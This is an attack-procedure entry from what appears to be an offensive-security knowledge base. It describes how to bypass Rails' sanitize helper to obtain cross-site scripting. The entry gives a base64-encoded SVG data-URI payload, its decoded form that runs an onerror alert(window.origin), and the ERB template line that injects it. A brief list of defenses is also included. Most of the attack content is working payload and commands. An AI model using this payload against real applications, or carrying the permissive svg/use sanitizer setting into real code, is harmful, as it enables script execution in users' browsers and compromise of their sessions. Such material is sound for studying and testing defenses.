---
tags:
  - xss
  - svg
  - base64
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/rails-sanitize-html-with-svg-tags]]'
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: bf82fc44-9136-4128-aa61-a6be391a5e78
created_at: '2025-12-13T23:52:34.188Z'
updated_at: '2025-12-13T23:52:34.188Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-SVG-Payload-Using-Base64-Data-URI

## Summary

This procedure injects a malicious SVG payload into a Rails ERB template using the sanitize helper with allowed 'svg' and 'use' tags, embedding a base64-encoded data URI that decodes to an XSS-triggering SVG.

## Description

Exploiting the Loofah sanitization flaw, the payload uses the 'use' tag to reference a data:image/svg+xml URI base64-encoded with an inner SVG containing an <image> element with an invalid href and onerror JavaScript handler. When sanitized and rendered, the payload evades filtering, allowing the URI to load and execute JS in the browser context.

## Requirements

1. Sanitizer configured to allow 'svg' and 'use' tags (from prior procedure)
2. Access to ERB templates or user input fields processed by sanitize
3. Rails development environment for testing injection

## Defense

Defensive measures and detection strategies:

- Block data: URIs in CSP or via custom sanitizer rules
- Validate and strip base64 content in SVG attributes server-side
- Use libraries like Rails' built-in escaping or third-party validators for SVG
- Log and alert on sanitize calls with SVG tags in production

## Objectives

1. Embed the bypass payload without triggering sanitization
2. Ensure the base64 URI decodes to executable SVG
3. Set up for client-side triggering of XSS

## Instructions

### Step 1: Prepare the Payload

**Context**: Encode the malicious inner SVG as base64 for the data URI.

The payload string is: <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x"/></svg>

> This decodes to: <svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'><image href="1" onerror="alert(window.origin)"/></svg>

### Step 2: Inject via Sanitize Helper

**Context**: Use the sanitize command in the ERB template to render the payload.

**Command** ([[commands/rails-sanitize-html-with-svg-tags]]):
```erb
<%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/"></svg>", tags: %w(svg use) %>
```

> Renders the SVG; inspect source to confirm the 'use' href is intact. No JS executes yet.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/rails-sanitize-html-with-svg-tags]]

## Tools Used


## Tags

- [[xss]]
- [[svg]]
- [[base64]]
